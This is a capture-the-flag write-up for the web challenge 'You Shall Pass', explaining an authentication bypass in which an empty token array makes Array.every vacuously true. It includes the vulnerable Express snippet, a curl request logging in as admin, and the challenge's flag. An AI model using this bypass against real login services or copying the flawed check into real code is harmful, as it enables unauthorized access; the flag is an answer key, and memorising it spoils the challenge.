---
title: You Shall Pass
challenge_type: Web
difficulty: easy
author: ulisesalan
writeup_author: "xabito"
competition: wolvctf-2026
summary: |-
  An authentication service asks you to log in with a user and token. It checks every submitted token against a signature on file. Admin access is ordinarily off limits, but does the verifier really check every token before admitting a login?

  Send a POST request to /login with a JSON body containing a user and a token.
connections:
  - url: https://you-shall-pass-web.wolvctf-2026.kctf.cloud/
attachments:
  - title: server.js
    url: /assets/files/wolvctf-2026/you-shall-pass/server.js
---

## Recon

The service accepts `POST /login` with a JSON `user` and `token`. The supplied Express code computes the expected token as an HMAC-SHA256 of the username under a secret. HMAC-SHA256 is a keyed message-authentication code derived from SHA-256, and forging is ruled out because the secret is 32 fresh random bytes we don't know. Two checks gate the response, and they live together in the same snippet:

```javascript
const expected = expectedToken(user);
const tokens = [].concat(token);
if (!tokens.every((candidate) => candidate === expected)) {
  return res.status(403).json({ error: "bad token" });
}
return res.json({ flag: FLAG });
```

A separate guard also requires `user === "admin"`.

## The empty-array bypass

The token check has a small hole. `[].concat(token)` turns the submitted token into an array, and `Array.prototype.every` returns `true` the moment no element fails its test. On an empty array the callback never runs at all. If we send `token` as an empty array, `[].concat([])` is `[]`, and `tokens.every(...)` is vacuously true: no token is ever compared against the HMAC.

We confirm this in Node before touching the service:

```bash
$ node -e 'const t = [].concat([]); console.log(t, t.every(x => x === "expected"))'
[] true
```

## Flag capture

With `user` set to `admin` and `token` set to `[]`, both checks pass:

```bash
$ curl -s -i -X POST https://you-shall-pass-web.wolvctf-2026.kctf.cloud/login \
    -H 'Content-Type: application/json' \
    -d '{"user":"admin","token":[]}'
HTTP/2 200
content-type: application/json; charset=utf-8

{"flag":"wctf{acc011233b7b476af70ecf802cf7dc7b}"}
```